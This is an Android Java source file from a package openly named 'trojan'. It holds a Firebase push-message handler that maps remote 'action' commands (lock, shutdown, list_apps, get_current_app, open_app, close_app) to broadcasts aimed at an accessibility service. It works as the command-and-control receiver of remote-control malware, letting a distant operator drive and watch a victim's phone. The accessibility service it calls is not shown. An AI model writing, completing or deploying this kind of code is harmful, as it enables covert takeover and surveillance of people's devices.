package com.trojan;

import android.content.Intent;
import android.util.Log;
import androidx.annotation.NonNull;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        Log.d(TAG, "FCM Message From: " + remoteMessage.getFrom());

        if (remoteMessage.getData().size() > 0) {
            Map<String, String> data = remoteMessage.getData();
            Log.d(TAG, "Message data payload: " + data);

            String action = data.get("action");
            if (action == null) {
                Log.w(TAG, "No 'action' key found in FCM message data.");
                return;
            }

            Intent intent = null;
            // Use a switch for cleaner handling of multiple actions
            switch (action.toLowerCase()) {
                case "lock":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);
                    break;
                case "shutdown":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
                    break;
                case "list_apps":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LIST_APPS);
                    break;
                case "get_current_app":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_CURRENT_APP);
                    break;
                case "open_app":
                    String packageToOpen = data.get("package_name");
                    if (packageToOpen != null) {
                        intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_OPEN_APP);
                        intent.putExtra("package_name", packageToOpen);
                    } else {
                        Log.w(TAG, "Action 'open_app' received without 'package_name'.");
                    }
                    break;
                case "close_app":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_CLOSE_APP);
                    break;
                default:
                    Log.w(TAG, "Received unknown action: " + action);
            }

            if (intent != null) {
                Log.d(TAG, "Broadcasting action: " + intent.getAction());
                sendBroadcast(intent);
            }
        }
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.d(TAG, "Refreshed FCM token: " + token);
        // The main activity already handles uploading the token, so we just log here.
    }
}
